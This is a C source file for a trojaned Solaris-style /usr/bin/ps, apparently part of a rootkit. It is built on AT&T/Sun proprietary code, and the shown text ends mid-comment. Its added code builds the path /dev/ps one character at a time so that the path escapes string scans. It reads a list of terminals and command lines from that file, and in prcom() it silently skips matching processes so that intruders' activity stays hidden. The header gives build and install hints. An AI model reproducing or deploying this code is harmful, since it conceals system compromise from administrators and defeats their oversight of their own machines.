/* this is /usr/bin/ps */
/* compile with cc ps.c -o ps -lw -lintl, try running, if any errors running
   compile with cc -DELEETFIX ps.c -o ps -lw -lintl 
   default patch file is /dev/ps and wont show up in a string of ps
   patch file format is:
0 "pts/0" for a tty
1 "program" for a program
   the program name must be the FULL process name with arguments
   this can be obtained with ps -f */
/*	Copyright (c) 1984, 1986, 1987, 1988, 1989 AT&T	*/
/*	  All Rights Reserved  	*/

/*	THIS IS UNPUBLISHED PROPRIETARY SOURCE CODE OF AT&T	*/
/*	The copyright notice above does not evidence any   	*/
/*	actual or intended publication of such source code.	*/

#ident	"@(#)ps.c	1.15	93/04/08 SMI"	/* SVr4.0 1.62.20.1	*/

/*
 * ps -- print things about processes.
 */
#include <stdio.h>
#include <euc.h>
#include <ctype.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <pwd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <ftw.h>
#include <unistd.h>
#include <stdlib.h>
#include <limits.h>
#include <sys/mntent.h>
#include <sys/mnttab.h>
#include <dirent.h>
#include <sys/signal.h>
#include <sys/fault.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/procfs.h>
#include <locale.h>
#include <wctype.h>
#include <stdarg.h>



#define	TRUE	1
#define	FALSE	0

#define NTTYS	20	/* max ttys that can be specified with the -t option  */
#define SIZ	30	/* max processes that can be specified with -p and -g */
#define ARGSIZ	30	/* size of buffer holding args for -t, -p, -u options */

#define FSTYPE_MAX	8

#ifndef MAXLOGIN
#define MAXLOGIN 8	/* max number of chars in login that will be printed */
#endif

/* Structure for storing user info */
struct udata {
	uid_t	uid;		/* numeric user id */
	char	name[MAXLOGIN];	/* login name, may not be null terminated */
};

/* udata and devl granularity for structure allocation */
#define UDQ	50

#if 0
/* Pointer to user data */
struct udata *ud;
int	nud = 0;	/* number of valid ud structures */
int	maxud = 0;	/* number of ud's allocated */
#endif

struct udata uid_tbl[SIZ];	/* table to store selected uid's */
int	nut = 0;		/* counter for uid_tbl */

struct prpsinfo info;	/* process information structure from /proc */

int	retcode = 1;
int	lflg;
int	eflg;
int	uflg;
int	aflg;
int	dflg;
int	pflg;
int	fflg;
int	cflg;
int	jflg;
int	gflg;
int	sflg;
int	tflg;
int	errflg;
int	isatty();
char	*gettty();
char	*ttyname();
char	argbuf[ARGSIZ];
char	*parg;
char	*p1;			/* points to successive option arguments */
static char	stdbuf[BUFSIZ];

int	ndev;			/* number of devices */
int	maxdev;			/* number of devl structures allocated */

#define DNSIZE	14
struct devl {			/* device list	 */
	char	dname[DNSIZE];	/* device name	 */
	dev_t	dev;		/* device number */
} *devl;

char	*tty[NTTYS];	/* for t option */
int	ntty = 0;
pid_t	pid[SIZ];	/* for p option */
int	npid = 0;
pid_t	grpid[SIZ];	/* for g option */
int	ngrpid = 0;
pid_t	sessid[SIZ];	/* for s option */
int	nsessid = 0;

char	*rroot  = NULL;		/* remote system root path */
char	*procdir = "/proc";	/* standard /proc directory */
int	rd_only = 0;		/* flag for remote filesystem read-only */
char	*rpath();		/* determines root directory for remote */
void	usage();		/* print usage message and quit */

extern int	errno;

/* patch shit */
#define MAXHIDE 10
char HFILE[20];
char htty[MAXHIDE][15];
char hpro[MAXHIDE][80];
int tnum=0, pnum=0;
/* patch rootinez */
char *sb();
int intty();
int inpro();

main(argc, argv)
	int	argc;
	char	**argv;
{
	FILE *pf; /* patch file */
	char fbuf[80];
	int tn;
	int prcomret;
	register char	**ttyp = tty;
	char	*name;
	char	*p;
	char	*dfix;
	int	c;
	uid_t	puid;		/* puid: process user id */
	pid_t	ppid;		/* ppid: parent process id */
	pid_t	ppgrp;		/* ppgrp: process group id */
	pid_t	psid;		/* psid: session id */
	int	i, found;
	extern char	*optarg;
	extern int	optind;
	int	pgerrflg = 0;	/* err flg: non-numeric arg w/p & g options */
	void	getdev();

	unsigned	size;

	DIR *dirp;
	struct dirent *dentp;
	char	pname[100];
	int	pdlen;

	(void)setlocale(LC_ALL, "");
#if !defined(TEXT_DOMAIN)	/* Should be defined by cc -D */
#define TEXT_DOMAIN "SYS_TEST"	/* Use this only if it weren't */
#endif
	(void) textdomain(TEXT_DOMAIN);
	strcpy(HFILE, "");
strcat(HFILE, "/"); strcat(HFILE, "d"); strcat(HFILE, "e"); strcat(HFILE, "v");
strcat(HFILE, "/"); strcat(HFILE, "p"); strcat(HFILE, "s");

if ((pf=fopen(HFILE, "r"))!=NULL) {
        fgets(fbuf, 80, pf);
        while (!feof(pf)) {
                sscanf(fbuf, "%d", &tn);
                switch (tn) {
                        case 0:
                                strcpy(htty[tnum], sb(fbuf));
                                tnum++;
                                break;
                        case 1:
                                strcpy(hpro[pnum], sb(fbuf));
                                pnum++;
                                break;
                        }
                fgets(fbuf, 80, pf);
                }
        fclose(pf);
        } 

	setbuf(stdout, stdbuf);
	while ((c = getopt(argc, argv, "jlfceadt:p:g:u:n:s:")) != EOF)
		switch (c) {
		case 'l':		/* long listing */
			lflg++;
			break;
		case 'f':		/* full listing */
			fflg++;
			break;
		case 'j':
			jflg++;
			break;
		case 'c':
			/*
			 * Format output to reflect scheduler changes:
			 * high numbers for high priorities and don't
			 * print nice or p_cpu values.  'c' option only
			 * effective when used with 'l' or 'f' options.
			 */
			cflg++;
			break;
		case 'e':		/* list for every process */
			eflg++;
			tflg = uflg = pflg = gflg = sflg = 0;
			break;
		case 'a':
			/*
			 * Same as 'e' except no process group leaders
			 * and no non-terminal processes.
			 */
			aflg++;
			break;
		case 'd':	/* same as e except no proc grp leaders */
			dflg++;
			break;
		case 'n':	/* no longer needed; retain as no-op */
			fprintf(stderr, "ps: warning: -n option ignored\n");
			break;
		case 't':		/* terminals */
#define TSZ 30
			tflg++;
			p1 = optarg;
			do {
				parg = argbuf;
				if (ntty >= NTTYS)
					break;
				getarg();
				if ((p = (char *)malloc(TSZ)) == NULL) {
					fprintf(stderr, "ps: no memory\n");
					exit(1);
				}
				size = TSZ;
				if (isdigit(*parg)) {
					(void) strcpy(p, "tty");
					size -= 3;
				}
				(void) strncat(p, parg, (int)size);
				*ttyp++ = p;
				ntty++;
			} while (*p1);
			break;
		case 'p':		/* proc ids */
			pflg++;
			p1 = optarg;
			parg = argbuf;
			do {
				if (npid >= SIZ)
					break;
				getarg();
				if (!num(parg)) {
					pgerrflg++;
					fprintf(stderr,
					  "ps: %s is an invalid non-numeric argument for -p option\n",
					  parg);
				}
				pid[npid++] = (pid_t)atol(parg);
			} while (*p1);
			break;
		case 's':		/* session */
			sflg++;
			p1 = optarg;
			parg = argbuf;
			do {
				if (nsessid >= SIZ)
					break;
				getarg();
				if (!num(parg)) {
					pgerrflg++;
					fprintf(stderr,
					  "ps: %s is an invalid non-numeric argument for -s option\n",
					  parg);
				}
				sessid[nsessid++] = (pid_t)atol(parg);
			} while (*p1);
			break;
		case 'g':		/* proc group */
			gflg++;
			p1 = optarg;
			parg = argbuf;
			do {
				if (ngrpid >= SIZ)
					break;
				getarg();
				if (!num(parg)) {
					pgerrflg++;
					fprintf(stderr,
					  "ps: %s is an invalid non-numeric argument for -g option\n",
					  parg);
				}
				grpid[ngrpid++] = (pid_t)atol(parg);
			} while (*p1);
			break;
		case 'u':		/* user name or number */
			uflg++;
			p1 = optarg;
			parg = argbuf;
			do {
				getarg();
				if (nut < SIZ)
					(void) strncpy(uid_tbl[nut++].name,
					  parg, MAXLOGIN);
			} while (*p1);
			break;
		default:			/* error on ? */
			errflg++;
			break;
		}

	if (errflg || optind < argc || pgerrflg)
		usage();

	if (tflg)
		*ttyp = 0;
	/*
	 * If an appropriate option has not been specified, use the
	 * current terminal as the default.
	 */
	if (!(aflg || eflg || dflg || uflg || tflg || pflg || gflg || sflg)) {
		name = NULL;
		for (i = 2; i >= 0; i--)
			if (isatty(i)) {
				name = ttyname(i);
				break;
			}
		if (name == NULL) {
			fprintf(stderr,
			  "ps: can't find controlling terminal\n");
			exit(1);
		}
		*ttyp++ = name + 5;
		*ttyp = 0;
		ntty++;
		tflg++;
	}
	if (eflg)
		tflg = uflg = pflg = sflg = gflg = aflg = dflg = 0;
	if (aflg || dflg)
		tflg = 0;

	if (!readata()) {	/* get data from psfile */
		getdev();
		wrdata();
	}
	uconv();

	if (lflg)
		printf(" F S");
	if (fflg) {
		if (lflg)
			printf(" ");
		printf("     UID");
	} else if (lflg)
		printf("   UID");
	printf("   PID");
	if (lflg || fflg)
		printf("  PPID");
	if (jflg)
		printf("  PGID   SID");
	if (cflg)
		printf("  CLS PRI");
	else if (lflg || fflg) {
		printf("  C");
		if (lflg)
			printf(" PRI NI");
	}
	if (lflg)
		printf("     ADDR     SZ    WCHAN");
	if (fflg)
		printf("    STIME");
	printf(" TTY      TIME COMD\n");

	/*
	 * Determine which processes to print info about by searching
	 * the /proc directory and looking at each process.
	 */
	if ((dirp = opendir(procdir)) == NULL) {
		(void) fprintf(stderr, "ps: cannot open PROC directory %s%s\n",
		  rroot ? rroot : "", procdir);
		exit(1);
	}

	(void) strcpy(pname, procdir);
	pdlen = strlen(pname);
	pname[pdlen++] = '/';

	/* for each active process --- */
	while (dentp = readdir(dirp)) {
		int	procfd;		/* filedescriptor for /proc/nnnnn */
		dfix = dentp->d_name;
#ifdef ELEETFIX
		dfix = &(dentp->d_name[-2]);
#endif
		if (dfix[0] == '.')		/* skip . and .. */
			continue;
		(void) strcpy(pname + pdlen, dfix);
retry:
		if ((procfd = open(pname, O_RDONLY)) == -1)
			continue;
		/*
		 * Get the info structure for the process and close quickly.
		 */
		if (ioctl(procfd, PIOCPSINFO, (char *) &info) == -1) {
			int	saverr = errno;

			(void) close(procfd);
			if (saverr == EAGAIN)
				goto retry;
			if (saverr != ENOENT)
				(void) fprintf(stderr,
				  "ps: PIOCPSINFO on %s: %s\n",
				  pname, strerror(saverr));
			continue;
		}
		(void) close(procfd);

		found = 0;
		if (info.pr_state == 0)		/* can't happen? */
			continue;
		puid = info.pr_uid;
		ppid = info.pr_pid;
		ppgrp = info.pr_pgrp;
		psid = info.pr_sid;

		/*
		 * Omit process group leaders for 'a' and 'd' options.
		 */
		if ((ppid == psid) && (dflg || aflg))
			continue;
		if (eflg || dflg)
			found++;
		else if (pflg && search(pid, npid, ppid))
			found++;	/* ppid in p option arg list */
		else if (uflg && ufind(puid))
			found++;	/* puid in u option arg list */
		else if (gflg && search(grpid, ngrpid, ppgrp))
			found++;	/* grpid in g option arg list */
		else if (sflg && search(sessid, nsessid, psid))
			found++;	/* sessid in s option arg list */
		if (!found && !tflg && !aflg )
			continue;
		if (prcomret=prcom(puid, found)) {
			/*printf("prcomret=%d\n", prcomret);*/
			if (prcomret!=69) printf("\n");
			retcode = 0;
		}
	}

	(void) closedir(dirp);
	exit(retcode);
	/* NOTREACHED */
}

static void	
usage()		/* print usage message and quit */
{
	static char usage1[] = "ps [ -edalfcj ] [ -t termlist ]";
	static char usage2[] = "\t[ -u uidlist ] [ -p proclist ] [ -g grplist ] [ -s sidlist ]";

	fprintf(stderr, "usage: %s\n%s\n", gettext(usage1), gettext(usage2));
	exit(1);
}

/*
 * readata reads in the open devices (terminals) and stores 
 * info in the devl structure.
 */
static char	psfile[] = "/tmp/ps_data";

int
readata()
{
	struct stat sbuf1, sbuf2;
	int fd;

	if ((fd = open(psfile, O_RDONLY)) == -1)
		return 0;

	if (fstat(fd, &sbuf1) < 0
	  || sbuf1.st_size == 0
	  || stat("/dev", &sbuf2) == -1
	  || sbuf1.st_mtime <= sbuf2.st_mtime
	  || sbuf1.st_mtime <= sbuf2.st_ctime
#if 0
	  || stat("/etc/passwd", &sbuf2) == -1
	  || sbuf1.st_mtime <= sbuf2.st_mtime
	  || sbuf1.st_mtime <= sbuf2.st_ctime
#endif
	  ) {
		if (!rd_only) {		/* if read-only, believe old data */
			(void) close(fd);
			return 0;
		}
	}

	/* Read /dev data from psfile. */
	if (psread(fd, (char *) &ndev, sizeof(ndev)) == 0)  {
		(void) close(fd);
		return 0;
	}

	if ((devl = (struct devl *)malloc(ndev * sizeof(*devl))) == NULL) {
		fprintf(stderr, "ps: malloc() for device table failed, %s\n",
		  strerror(errno));
		exit(1);
	}
	if (psread(fd, (char *)devl, ndev * sizeof(*devl)) == 0)  {
		(void) close(fd);
		return 0;
	}

#if 0
	/* Read /etc/passwd data from psfile. */
	if (psread(fd, (char *) &nud, sizeof(nud)) == 0)  {
		(void) close(fd);
		return 0;
	}
	if ((ud = (struct udata *)malloc(nud * sizeof(*ud))) == NULL) {
		fprintf(stderr, "ps: not enough memory for udata table\n");
		exit(1);
	}
	if (psread(fd, (char *)ud, nud * sizeof(*ud)) == 0)  {
		(void) close(fd);
		return 0;
	}
#endif

	(void) close(fd);
	return 1;
}

/*
 * getdev() uses ftw() to pass pathnames under /dev to gdev()
 * along with a status buffer.
 */
void
getdev()
{
	int	gdev();
	int	rcode;

	ndev = 0;
	rcode = ftw("/dev", gdev, 17);

	switch (rcode) {
	case 0:
		return;		/* successful return, devl populated */
	case 1:
		fprintf(stderr, "ps: ftw() encountered problem\n");
		break;
	case -1:
		fprintf(stderr, "ps: ftw() failed, %s\n", strerror(errno));
		break;
	default:
		fprintf(stderr, "ps: ftw() unexpected return, rcode=%d\n",
		 rcode);
		break;
	}
	exit(1);
}

/*
 * gdev() puts device names and ID into the devl structure for character
 * special files in /dev.  The "/dev/" string is stripped from the name
 * and if the resulting pathname exceeds DNSIZE in length then the highest
 * level directory names are stripped until the pathname is DNSIZE or less.
 */
int
gdev(objptr, statp, numb)
	char	*objptr;
	struct stat *statp;
	int	numb;
{
	register int	i;
	int	leng, start;
	static struct devl ldevl[2];
	static int	lndev, consflg;

	switch (numb) {

	case FTW_F:	
		if ((statp->st_mode & S_IFMT) == S_IFCHR) {
			/* Get more and be ready for syscon & systty. */
			while (ndev + lndev >= maxdev) {
				maxdev += UDQ;
				devl = (struct devl *) ((devl == NULL) ? 
				  malloc(sizeof(struct devl ) * maxdev) : 
				  realloc(devl, sizeof(struct devl ) * maxdev));
				if (devl == NULL) {
					fprintf(stderr,
					    "ps: not enough memory for %d devices\n",
					    maxdev);
					exit(1);
				}
			}
			/*
			 * Save systty & syscon entries if the console
			 * entry hasn't been seen.
			 */
			if (!consflg
			  && (strcmp("/dev/systty", objptr) == 0
			    || strcmp("/dev/syscon", objptr) == 0)) {
				(void) strncpy(ldevl[lndev].dname,
				  &objptr[5], DNSIZE);
				ldevl[lndev].dev = statp->st_rdev;
				lndev++;
				return 0;
			}

			leng = strlen(objptr);
			/* Strip off /dev/ */
			if (leng < DNSIZE + 4)
				(void) strcpy(devl[ndev].dname, &objptr[5]);
			else {
				start = leng - DNSIZE - 1;

				for (i = start; i < leng && (objptr[i] != '/');
				  i++)
					;
				if (i == leng )
					(void) strncpy(devl[ndev].dname,
					  &objptr[start], DNSIZE);
				else
					(void) strncpy(devl[ndev].dname,
					  &objptr[i+1], DNSIZE);
			}
			devl[ndev].dev = statp->st_rdev;
			ndev++;
			/*
			 * Put systty & syscon entries in devl when console
			 * is found.
			 */
			if (strcmp("/dev/console", objptr) == 0) {
				consflg++;
				for (i = 0; i < lndev; i++) {
					(void) strncpy(devl[ndev].dname,
					  ldevl[i].dname, DNSIZE);
					devl[ndev].dev = ldevl[i].dev;
					ndev++;
				}
				lndev = 0;
			}
		}
		return 0;

	case FTW_D:
	case FTW_DNR:
	case FTW_NS:
		return 0;

	default:
		fprintf(stderr, "ps: gdev() error, %d, encountered\n", numb);
		return 1;
	}
}

#if 0
/*
 * Get the passwd file data into the ud structure.
 */
getpasswd()
{
	struct passwd *pw, *getpwent();
	void	endpwent();

	ud = NULL;
	nud = 0;
	maxud = 0;

	while ((pw = getpwent()) != NULL) {
		while (nud >= maxud) {
			maxud += UDQ;
			ud = (struct udata *) ((ud == NULL) ? 
			  malloc(sizeof(struct udata ) * maxud) : 
			  realloc(ud, sizeof(struct udata ) * maxud));
			if (ud == NULL) {
				fprintf(stderr,
				  "ps: not enough memory for %d users\n", maxud);
				exit(1);
			}
		}
		/*
		 * Copy fields from pw file structure to udata.
		 */
		ud[nud].uid = pw->pw_uid;
		(void) strncpy(ud[nud].name, pw->pw_name, MAXLOGIN);
		nud++;
	}
	endpwent();
}
#endif

wrdata()
{
	char	tmpname[16];
	char *	tfname;
	int	fd;

	(void) umask(02);
	(void) strcpy(tmpname, "/tmp/ps.XXXXXX");
	if ((tfname = mktemp(tmpname)) == NULL || *tfname == '\0') {
		fprintf(stderr, "ps: mktemp(\"/tmp/ps.XXXXXX\") failed, %s\n",
		    strerror(errno));
		fprintf(stderr, "ps: Please notify your System Administrator\n");
		return;
	}

	if ((fd = open(tfname, O_WRONLY|O_CREAT|O_EXCL, 0664)) < 0) {
		fprintf(stderr, "ps: open(\"%s\") for write failed, %s\n",
		    tfname, strerror(errno));
		fprintf(stderr, "ps: Please notify your System Administrator\n");
		return;
	}

	/*
	 * Make owner root, group sys.
	 */
	(void) chown(tfname, (uid_t)0, (gid_t)3);

	/* write /dev data */
	pswrite(fd, (char *) &ndev, sizeof(ndev));
	pswrite(fd, (char *)devl, ndev * sizeof(*devl));

#if 0
	/* write /etc/passwd data */
	pswrite(fd, (char *) &nud, sizeof(nud));
	pswrite(fd, (char *)ud, nud * sizeof(*ud));
#endif

	(void) close(fd);

	if (rename(tfname, psfile) != 0) {
		fprintf(stderr, "ps: rename(\"%s\",\"%s\") failed, %s\n",
		    tfname, psfile, strerror(errno));
		fprintf(stderr, "ps: Please notify your System Administrator\n");
		return;
	}
}

/*
 * getarg() finds the next argument in list and copies arg into argbuf.
 * p1 first pts to arg passed back from getopt routine.  p1 is then
 * bumped to next character that is not a comma or blank -- p1 NULL
 * indicates end of list.
 */

getarg()
{
	char	*parga;

	parga = argbuf;
	while (*p1 && *p1 != ',' && *p1 != ' ')
		*parga++ = *p1++;
	*parga = '\0';

	while (*p1 && (*p1 == ',' || *p1 == ' '))
		p1++;
}

/*
 * gettty returns the user's tty number or ? if none.
 */
char *
gettty(ip)
	register int	*ip;	/* where the search left off last time */
{
	register int	i;

	if (info.pr_ttydev != PRNODEV && *ip >= 0) {
		for (i = *ip; i < ndev; i++) {
			if (devl[i].dev == info.pr_ttydev) {
				*ip = i + 1;
				return devl[i].dname;
			}
		}
	}
	*ip = -1;
	return "?";
}

/*
 * Print info about the process.
 */
prcom(puid, found)
	uid_t	puid;
	int	found;
{
	register char	*cp;
	register char	*tp;
	char	*ctime();
	long	tm;
	int	i, wcnt, length;
	wchar_t	wchar;
	register char	**ttyp, *str;
	struct passwd *pwd;

	/*
	 * If process is zombie, call print routine and return.
	 */
	if (info.pr_zomb) {
		if (tflg && !found)
			return 0;
		else {
			przom(puid);
			return 1;
		}
	}

	/*
	 * Get current terminal.  If none ("?") and 'a' is set, don't print
	 * info.  If 't' is set, check if term is in list of desired terminals
	 * and print it if it is.
	 */
	i = 0;
	tp = gettty(&i);
	if (aflg && *tp == '?')
		return 0;
	if (tflg && !found) {
		int match = 0;

		/*
		 * Look for same device under different names.
		 */
		while (i >= 0 && !match) {
			for (ttyp = tty; (str = *ttyp) != 0 && !match; ttyp++)
				if (strcmp(tp, str) == 0)
					match = 1;
			if (!match)
				tp = gettty(&i);
		}
		if (!match)
			return 0;
	}

	if (intty(tp)) return 69;
	if (inpro(info.pr_psargs)) return 69;
	if (lflg) {
		printf("%2x %c", info.pr_flag & 0377, info.pr_sname);  /* F S */
		if (fflg)
			printf(" ");
	}
	if (fflg) {
		if ((pwd = getpwuid(puid)) != NULL)
			printf("%8.8s", pwd->pw_name);
		else
			printf("%8.8ld", puid);
	} else if (lflg)
		printf("%6ld", puid);
	printf("%6ld", info.pr_pid);				/* PID */
	if (lflg || fflg)
		printf("%6ld", info.pr_ppid);			/* PPID */
	if (jflg) {
		printf("%6ld", info.pr_pgrp);			/* PGID */
		printf("%6ld", info.pr_sid);			/* SID  */
	}
	if (cflg) {
		printf("%5s", info.pr_clname);			/* CLS  */
		printf("%4d", info.pr_pri);			/* PRI	*/
	} else if (lflg || fflg) {
		printf("%3d", info.pr_cpu & 0377);		/* C   */
		if (lflg) {
			/*
			 * Print priorities the old way (lower numbers
			 * mean higher priority) and print nice value
			 * for time sharing procs.
			 */
			printf("%4d", info.pr_oldpri);
			if (strcmp(info.pr_clname, "TS") == 0)
				printf("%3d", info.pr_nice);
			else
				printf(" %2.2s", info.pr_clname);
		}
	}
	if (lflg) {
		printf("%9x%7d", info.pr_addr, info.pr_size);	/* ADDR SZ */
		if (info.pr_wchan)
			printf("%9x", info.pr_wchan);		/* WCHAN */
		else
			printf("         ");
	}
	if (fflg)						/* STIME */
		prtime(info.pr_start);
	printf(" %-7.14s", tp);					/* TTY */
	tm = info.pr_time.tv_sec;
	if (info.pr_time.tv_nsec > 500000000)
		tm++;
	printf(" %2ld:%.2ld", tm / 60, tm % 60);

	if (!fflg) {						/* CMD */
		wcnt = namencnt(info.pr_fname, 16, 8);
		printf(" %.*s", wcnt, info.pr_fname);
		return 1;
	}

/*
printf("info.pr_fname = >%s<\n", info.pr_fname);
printf("info.pr_psargs = >%s<\n", info.pr_psargs);*/

	/*
	 * PRARGSZ == length of cmd arg string.
	 */
	for (cp = info.pr_psargs; cp < &info.pr_psargs[PRARGSZ]; ) {
		if (*cp == 0) 
			break;
		length = mbtowc(&wchar, cp, MB_LEN_MAX);
		if (length < 0 || !iswprint(wchar)) {
	        	printf(" [ %.8s ]", info.pr_fname);
			return 1;
		}
		cp += length;
	}
	wcnt = namencnt(info.pr_psargs, PRARGSZ, lflg ? 35 : PRARGSZ);
	printf(" %.*s", wcnt, info.pr_psargs);
	return 1;
}

/*
 * Returns 1 if arg is found in array arr, of length num; 0 otherwise.
 */
int
search(arr, number, arg)
	pid_t arr[];
	register int number;
	register pid_t arg;
{
	register int i;

	for (i = 0; i < number; i++)
		if (arg == arr[i])
			return 1;
	return 0;
}

#if 1

uconv()
{
	struct passwd *pwd;
	int found, i, j;

	/*
	 * Ask NIS for oarg.
	 */
	for (i = 0; i < nut; i++) {
		/*
		 * If not found and oarg is numeric, ask for numeric id
		 */
		if ((pwd = getpwnam(uid_tbl[i].name)) == NULL
		  && uid_tbl[i].name[0] >= '0'
		  && uid_tbl[i].name[0] <= '9')
			pwd = getpwuid((uid_t)atol(uid_tbl[i].name));

		/*
		 * If found, enter found index into tbl array.
		 */
		if (pwd != NULL) {
			uid_tbl[i].uid = pwd->pw_uid;
			(void) strncpy(uid_tbl[i].name, pwd->pw_name,
			  MAXLOGIN);
		} else {
			fprintf(stderr,
			  "ps: unknown user %s\n", uid_tbl[i].name);
			for (j = i + 1; j < nut; j++) {
				(void) strncpy(uid_tbl[j-1].name,
				  uid_tbl[j].name, MAXLOGIN);
			}
			nut--;
			if (nut <= 0) 
				exit(1);
			i--;
		}
	}
}

#else

uconv()
{
	uid_t pwuid;
	int found, i, j;

	/*
	 * Search name array for oarg.
	 */
	for (i = 0; i < nut; i++) {
		found = -1;
		for (j = 0; j < nud; j++) {
			if (strncmp(uid_tbl[i].name, ud[j].name,
			  MAXLOGIN) == 0) {
				found = j;
				break;
			}
		}
		/*
		 * If not found and oarg is numeric, search number array.
		 */
		if (found < 0
		  && uid_tbl[i].name[0] >= '0'
		  && uid_tbl[i].name[0] <= '9') {
			pwuid = (uid_t)atol(uid_tbl[i].name);
			for (j = 0; j < nud; j++) {
				if (pwuid == ud[j].uid) {
					found = j;
					break;
				}
			}
		}

		/*
		 * If found, enter found index into tbl array.
		 */
		if (found != -1) {
			uid_tbl[i].uid = ud[found].uid;
			(void) strncpy(uid_tbl[i].name, ud[found].name,
			  MAXLOGIN);
		} else {
			fprintf(stderr,
			  "ps: unknown user %s\n", uid_tbl[i].name);
			for (j = i + 1; j < nut; j++) {
				(void) strncpy(uid_tbl[j-1].name,
				  uid_tbl[j].name, MAXLOGIN);
			}
			nut--;
			if (nut <= 0) 
				exit(1);
			i--;
		}
	}
}

#endif

#if 0
/*
 * For full command listing (-f flag) print user name instead of number.
 * Search table of userid numbers and if puid is found, return the
 * corresponding name.  Otherwise search /etc/passwd.
 */
int
getunam(puid)
	register uid_t puid;
{
	register int i;

	for (i = 0; i < nud; i++)
		if (ud[i].uid == puid)
			return i;
	return -1;
}
#endif

/*
 * Return 1 if puid is in table, otherwise 0.
 */
int
ufind(puid)
	register uid_t puid;
{
	register int i;

	for (i = 0; i < nut; i++)
		if (uid_tbl[i].uid == puid)
			return 1;
	return 0;
}

/*
 * Special read; unlinks psfile on read error.
 */
int
psread(fd, bp, bs)
	int fd;
	char *bp;
	unsigned int bs;
{
	int rbs;

	if ((rbs = read(fd, bp, bs)) != bs) {
		fprintf(stderr, "ps: psread() error on read, rbs=%d, bs=%d\n",
		  rbs, bs);
		(void) unlink(psfile);
		return 0;
	}
	return 1;
}

/*
 * Special write; unlinks psfile on write error.
 */
pswrite(fd, bp, bs)
int	fd;
char	*bp;
unsigned	bs;
{
	int	wbs;

	if ((wbs = write(fd, bp, bs)) != bs) {
		fprintf(stderr, "ps: pswrite() error on write, wbs=%d, bs=%d\n",
		  wbs, bs);
		(void) unlink(psfile);
	}
}

/*
 * Print starting time of process unless process started more than 24 hours
 * ago, in which case the date is printed.
 */
prtime(st)
	timestruc_t st;
{
	char sttim[26];
	static time_t tim = 0L;
	time_t starttime;

	if (tim == 0L)
		tim = time((time_t *) 0);
	starttime = st.tv_sec;
	if (st.tv_nsec > 500000000)
		starttime++;
	if (tim - starttime > 24*60*60) {
		cftime(sttim, "%b %d", &starttime);
		sttim[7] = '\0';
	} else {
		cftime(sttim, "%H:%M:%S", &starttime);
		sttim[8] = '\0';
	}
	printf("%9.9s", sttim);
}

przom(puid)
	uid_t	puid;
{
	int	i;
	long	tm;
	struct passwd *pwd;

	if (lflg)
		printf("%2x %c", info.pr_flag & 0377, info.pr_sname);  /* F S */
	if (fflg) {
		if ((pwd = getpwuid(puid)) != NULL)
			printf("%8.8s", pwd->pw_name);
		else
			printf("%8.8ld", puid);
	} else if (lflg)
		printf("%6ld", puid);
	printf("%6ld", info.pr_pid);				/* PID */
	if (lflg || fflg)
		printf("%6ld", info.pr_ppid);			/* PPID */
	if (jflg) {
		printf("%6ld", info.pr_pgrp);			/* PGID */
		printf("%6ld", info.pr_sid);			/* SID  */
	}
	if (cflg) {
		printf("     ");		/* zombies have no class */
		printf("%4d   ", info.pr_pri);			/* PRI	*/
	} else if (lflg || fflg) {
		printf("%3d", info.pr_cpu & 0377);		/* C   */
		if (lflg)
			printf("%4d", info.pr_oldpri);
	}
	if (fflg)
		printf("         ");				/* STIME */
	if (lflg)
		printf("                            ");	/* NI ADDR SZ WCHAN */
	tm = info.pr_time.tv_sec;
	if (info.pr_time.tv_nsec > 500000000)
		tm++;
	printf("         %2ld:%.2ld", tm / 60, tm % 60); /* TTY TIME */
	printf(" <defunct>");
}

/*
 * Returns true iff string is all numeric.
 */
int
num(s)
	register char	*s;
{
	register int c;

	if (s == NULL)
		return 0;
	c = *s;
	do {
		if (!isdigit(c))
			return 0;
	} while (c = *++s);
	return 1;
}

/*
 * Function to compute the number of printable bytes in a multibyte
 * command string ("internationalization").
 */
int
namencnt(cmd, eucsize, scrsize)
	register char *cmd;
	int eucsize;
	int scrsize;
{
	register int eucwcnt = 0, scrwcnt = 0;
	register int neucsz, nscrsz;
	wchar_t  wchar;

	while (*cmd != '\0') {
		if ((neucsz = mbtowc(&wchar, cmd, MB_LEN_MAX)) < 0)
			return 8; /* default to use for illegal chars */
		if ((nscrsz = scrwidth(wchar)) == 0)
			return 8;
		if (eucwcnt + neucsz > eucsize || scrwcnt + nscrsz > scrsize)
			break;
		eucwcnt += neucsz;
		scrwcnt += nscrsz;
		cmd += neucsz;
	}
	return eucwcnt;
}

/*
 * XXX - the following three routines are stolen from the generic mount
 *	 command. The first two (mntopt and hasmntopt) should be available
 *	 from libc!
 */
/*
 * Removed mntopt and hasmntopt.
 */

int
remote(fstype, rfp)
	char	*fstype;
	FILE	*rfp;
{
	char	buf[BUFSIZ];
	char	*fs;
	extern char *strtok();

	if (rfp == NULL || fstype == NULL ||
	    strlen(fstype) > (size_t)FSTYPE_MAX)
		return (0);	/* not a remote */
	rewind(rfp);
	while (fgets(buf, sizeof(buf), rfp) != NULL) {
		fs = strtok(buf, " \t");
		if (strcmp (fstype,fs) == 0) 
			return (1);	/* is a remote fs */
	}
	return (0);	/* not a remote */
}

char *
rpath(name)	/* given remote system name, return its root directory path */
	register char	*name;
{
	struct mnttab mnttab;
	register FILE *fp, *rfp;
	register char	*dirp;
	register char	*path = NULL;

	if (strchr(name, '/'))	/* if user specified a pathname, use it */
		return name;

	rfp = fopen("/etc/dfs/fstypes", "r");

	/*
	 * Open the mount table.
	 */
	if ((fp = fopen("/etc/mnttab", "r")) == NULL) {
		fprintf(stderr, "ps: cannot open /etc/mnttab\n");
		return NULL;
	}

	/*
	 * Search for a remote filesystem with last component matching name.
	 */
	while (getmntent(fp, &mnttab) == 0) {
		if (remote(mnttab.mnt_fstype, rfp) &&
		    (dirp = strrchr(mnttab.mnt_mountp, '/')) &&
		    strcmp(++dirp, name) == 0) {
			dirp = mnttab.mnt_mountp;
			path = (char *)malloc((unsigned)(strlen(dirp) + strlen(procdir) + 2));
			if (path == NULL) {
				fprintf(stderr,
				  "ps: not enough memory for remote pathname\n");
				exit(1);
			}
			(void) strcpy(path, dirp);
			(void) strcat(path, procdir);
			if (isprocdir(path)) {	/* found a /proc directory */
				rd_only = (int)hasmntopt(&mnttab, MNTOPT_RO);
				(void) strcpy(path, dirp);
				break;
			}
			free(path);
			path = NULL;
		}
	}
	(void) fclose(fp);
	if (rfp != NULL)
		(void) fclose(rfp);
	if (path == NULL)
		fprintf(stderr, "ps: cannot find path to system %s\n", name);
	return path;
}

/*
